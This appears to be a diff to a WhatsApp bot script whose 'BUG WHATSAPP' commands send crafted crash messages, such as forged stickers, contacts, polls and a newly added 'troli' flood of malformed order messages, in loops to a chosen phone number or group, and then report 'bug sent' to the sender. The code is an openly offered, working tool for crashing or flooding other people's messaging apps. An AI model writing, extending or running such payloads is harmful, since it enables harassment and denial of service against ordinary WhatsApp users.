@@ -4654,8 +4654,8 @@ break*/
 //━━━━━━━━━━━━━━━━━━━━━━━━[ BUG WHATSAPP ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━//
 
 case 'jadivirgam': //error
-virgam = fs.readFileSync('./image/gamvir.jpeg')
-alpha.sendMessage(from, { caption: "nih", image: fs.readFileSync("./image/gamvir.jpeg") }, { quoted: m, thumbnail: virgam })
+//virgam = fs.readFileSync('./image/gamvir.jpeg')
+alpha.sendMessage(from, { caption: "nih", image: virgam }, { quoted: m, thumbnail: virgam })
 break
 
 case 'bug1':
@@ -4777,7 +4777,7 @@ await alpha.sendMessage(m.chat, { text: toks, mentions: participants.map(a => a.
 await alpha.sendMessage(m.chat, { sticker: { url: "https://telegra.ph/file/25d567b38e5a8a1d8d573.png" }},{quoted: {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}}})
 await alpha.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 await alpha.sendContact(m.chat, bugkuntul, fkontol)
-await alpha.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+//await alpha.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
 alpha.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
 break
 
@@ -4794,8 +4794,8 @@ const fkontol = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.c
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({"pollCreationMessage": {"name": `HALO 👋 SAYA ${botname}`,"options": [{"optionName": "KATANYA WA KEBAL"},{"optionName": "BERANI VOTE GA"},{"optionName": "VOTE LAH SEMUA"},{"optionName": "KATANYA KEBAL"},{"optionName": "SALAM BROTHER BY PELER MOUTS WANGSAF"}],"selectableOptionsCount": 5}}), { userJid: m.chat, quoted: doc })
 await alpha.sendMessage(num + "@s.whatsapp.net", { sticker: { url: "https://telegra.ph/file/25d567b38e5a8a1d8d573.png" }},{quoted: {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}}})
 await alpha.relayMessage(num + "@s.whatsapp.net", audio.message, { messageId: audio.key.id })
-await alpha.sendContact(num + "@s.whatsapp.net", bugkuntul, fkontol)
-alpha.relayMessage(num + "@s.whatsapp.net", pollCreation.message, { messageId: pollCreation.key.id })
+alpha.sendContact(num + "@s.whatsapp.net", bugkuntul, fkontol)
+//alpha.relayMessage(num + "@s.whatsapp.net", pollCreation.message, { messageId: pollCreation.key.id })
 }
 reply(`*Sukses Kirim Bug ke :* ${num}\n*Jumlah :* ${jumlah}`)
 break
@@ -4819,6 +4819,28 @@ alpha.relayMessage(num + "@g.us", pollCreation.message, { messageId: pollCreatio
 //alpha.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
 }
 reply(`*Sukses Kirim Bug ke :* ${num}\n*Jumlah :* ${jumlah}`)
+break
+
+case 'troli':
+if (!isCreator) return reply(lang.ownerOnly())
+if (args.length == 0) return reply(`Penggunaan ${prefix+command} jumlah\nContoh : ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+	"orderMessage": {
+	"orderId": "599519108102353",
+	"thumbnail": virgam,
+	"itemCount": 1999,
+	"status": "INQUIRY",
+	"surface": "CATALOG",
+	"message": ` BY ${ownername} `,
+	"orderTitle": " BUG TROLI ", // 
+	"sellerJid": `${itsMe}@s.whatsapp.net`,
+	"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==",
+}
+}), { userJid: m.chat, quoted: doc })
+alpha.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
 break
 
 /*case 'bugpayment':
